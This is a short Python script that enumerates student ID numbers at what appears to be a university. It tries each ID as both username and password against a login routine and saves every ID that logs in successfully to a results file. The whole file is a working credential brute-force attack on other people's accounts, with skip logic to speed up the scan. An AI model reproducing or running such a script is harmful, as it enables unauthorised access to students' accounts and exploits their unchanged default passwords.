#coding:utf-8

import login3

#结果保存的文件
RESULT='result.re'
RESULTx='resultx.re'
#连接产生的记录文件
tempfile='mentemp.tmp'
logfile='menlog.log'
#年级
stunum1=2015
#学院
stunum2=1
#班级
stunum3=1
#班级里的学号
stunum4=1
#学校中的最大专业数(3代表本科后面的150才是数量, before 2015)
MAX_SUB=6999
#专业中的最大班级数
MAX_CLASS=40
#班里的最大学生数
MAX_STU=100
#mentohust connect time
DELAY=8
number=''
#检查多少个学生不存在后跳过这个班级
cheaknum=30
#检查多少个班级都没有学生后跳过这专业
cheakcnum=9

def search():
    global stunum1,stunum2,stunum3,stunum4,MAX_SUB,MAX_CLASS,MAX_STU
    global RESULT,RESULTx,tempfile,logfile
    global cheaknum,cheakcnum
    while stunum2 <= MAX_SUB :
        f = open("result.re", 'a+')
        cheakstemp=0
        cheakctemp=0
        while stunum3 <= MAX_CLASS :
            pre3 = ''
            if(stunum3 < 10):
                pre3 = '0'
            print(stunum3)
            while stunum4 <= MAX_STU :
                pre4 = ''
                if(stunum4 < 10):
                    pre4 = '0'
                #number = '{}{}{}{}{}{}'.format(stunum1,stunum2,pre3,stunum3,pre4,stunum4)
                number = ('%d%0004d%02d%02d' % (stunum1, stunum2, stunum3, stunum4))
                print(number)
                session = login3.loginget(number,number)
                if session != '' :
                    f.write(number + '\n')
                    print("OK")
                    cheakstemp = 0
                    cheakctemp = 0
                stunum4 = stunum4 + 1
                cheakstemp = cheakstemp + 1
                if cheakstemp > cheaknum : 
                    cheakstemp = 0
                    print('skip class')   
                    break 
            stunum3 = stunum3 + 1
            stunum4 = 1
            cheakctemp = cheakctemp + 1
            if cheakctemp > cheakcnum : 
                cheakctemp = 0
                stunum2 = int((stunum2 + 10)/10) * 10
                print('skip majer')    
                break 
        stunum2 = stunum2 + 1
        stunum3 = 1
        stunum4 = 1
        f.close()
    f.close()

search()
#session = login3.loginget("201430330133","201430330133")
#print(session)






